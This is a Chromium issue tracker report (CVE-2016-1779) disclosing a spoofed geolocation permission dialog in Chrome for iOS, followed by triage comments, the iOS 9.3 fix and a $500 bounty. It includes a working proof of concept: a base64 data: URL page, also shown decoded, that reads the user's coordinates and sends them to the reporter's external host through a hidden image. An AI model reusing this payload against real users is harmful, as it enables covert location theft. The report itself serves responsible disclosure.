# Security: Geolocation API Spoof in Chrome For iOS

| Field | Value |
|-------|-------|
| **Issue ID** | [40082205](https://issues.chromium.org/issues/40082205) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Unknown |
| **Platforms** | iOS |
| **CVE IDs** | CVE-2016-1779 |
| **Reporter** | xi...@gmail.com |
| **Assignee** | lg...@chromium.org |
| **Created** | 2015-06-01 |
| **Bounty** | $500.00 |

## Description

AFFECTED PRODUCTS
--------------------
IPhone:
Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/12F70 Safari/600.1.4 (000178)

IPad:
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/12F69 Safari/600.1.4 (000134)

DESCRIPTION
--------------------
In the Chrome for IOS,write "data:text/html,…… geolocation API……“ in the URL address bar。Geolocation API will pop up a location authorization dialog ,the domain will be displayed as":// " .An attacker can make this location authorization dialog appear in another domain to spoof user.When the user click allow, the location will be acquired by the attacker.

PoC
--------------------

<a href="data:text/html;base64,PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ +CjxtZXRhIGNoYXJzZXQ9dXRmLTggLz4KPHRpdGxlPmdlb2xvY2F0aW9uPC90aXRsZT4KPGJvZHk+CjxzY3JpcHQ +CmZ1bmN0aW9uIHN1Y2Nlc3MocG9zaXRpb24pIHsKZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3JlbW90ZScpLnNyYz0iaHR0cDovL3hpc2lnci5jb20vdGVzdC9nZW8v Z2V0LnBocD9nZW9sb2NhdGlvbj0iKyItLS0tLS0iK2VuY29kZVVSSUNvbXBvbmVudChwb3NpdGlvbi5jb29yZHMubGF0aXR1ZGUpKyIsIitlbmNvZGVVUklDb21wb25lb nQocG9zaXRpb24uY29vcmRzLmxvbmdpdHVkZSk7CiB9Cm5hdmlnYXRvci5nZW9sb2NhdGlvbi5nZXRDdXJyZW50UG9zaXRpb24oc3VjY2Vzcyk7Cjwvc2NyaXB0Pgo8aW 1nIGlkPSJyZW1vdGUiIHNyYz0iIiB3aWR0aD0wIGhlaWdodD0wPgo8L2JvZHk+CjwvaHRtbD4=" target="go" onclick="fake()"><h1>click  me</h1></a>

<script>
    function fake() {
        if (navigator.userAgent.indexOf("iPhone") > -1) {
            setTimeout("gs()", 0);
        }
        if (navigator.userAgent.indexOf("iPad") > -1) {
            setTimeout("gs()", 200);
        }
    }
    function gs() {
        window.open('http://www.google.com', 'go');
    }
</script>

Base64 decode：

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset=utf-8 />
<title>geolocation</title>
<body>
<script>
function success(position) {
document.getElementById('remote').src="http://xisigr.com/test/geo/get.php?geolocation="+"------"+encodeURIComponent(position.coords.latitude)+","+encodeURIComponent(position.coords.longitude);
 }
navigator.geolocation.getCurrentPosition(success);
</script>
<img id="remote" src="" width=0 height=0>
</body>
</html>

Online Demo:http://xisigr.com/test/geo/geo.html
user’s location: http://xisigr.com/test/geo/info.txt

CREDIT
--------------------
This vulnerability was discovered by xisigr of Tencent's Xuanwu LAB(http://www.tencent.com).
Email:xisigr@gmail.com


## Timeline

### np...@chromium.org (2015-06-01)

lgarron can you reproduce and triage this?  Thanks

### np...@chromium.org (2015-06-01)

lgarron can you reproduce and triage this?  Thanks

### pa...@chromium.org (2015-06-02)

[Empty comment from Monorail migration]

### pi...@chromium.org (2015-06-02)

+stuart, fixing labels

### st...@chromium.org (2015-06-02)

Geo auth is 100% controlled by UIWebView, so it's almost certain the only thing that we can do is file a Radar.

WKWebView doesn't delegate these either (which we have an existing Radar for), so I don't think we can do anything there either.

### pa...@chromium.org (2015-06-02)

Sounds like ExternalDependency, then?

### st...@chromium.org (2015-06-08)

Filed rdar://21289208

### la...@google.com (2015-08-24)

Adding default Pri-2

### xi...@gmail.com (2016-03-22)

About the security content of iOS 9.3
https://support.apple.com/en-us/HT206166

WebKit
Available for: iPhone 4s and later, iPod touch (5th generation) and later, iPad 2 and later
Impact: Visiting a maliciously crafted website may reveal a user's current location
Description: An issue existed in the parsing of geolocation requests. This was addressed through improved validation of the security origin for geolocation requests.
CVE-ID
CVE-2016-1779 : xisigr of Tencent's Xuanwu Lab (http://www.tencent.com)


### mb...@chromium.org (2016-06-10)

Based on c#9 this is fixed, right? Please update this if that is incorrect.

### sh...@chromium.org (2016-06-11)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-06-27)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-14)

Congratulations, the panel has decided to award $500 for this bug!  Our finance team will be in touch in the next few weeks with more details.

### aw...@chromium.org (2016-07-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-17)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### la...@chromium.org (2016-12-09)

Security>UX component is deprecated in favor of the Team-Security-UX label

[Monorail components: -Security>UX]

### is...@google.com (2016-12-09)

This issue was migrated from crbug.com/chromium/494987?no_tracker_redirect=1

[Auto-CCs applied]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082205)*
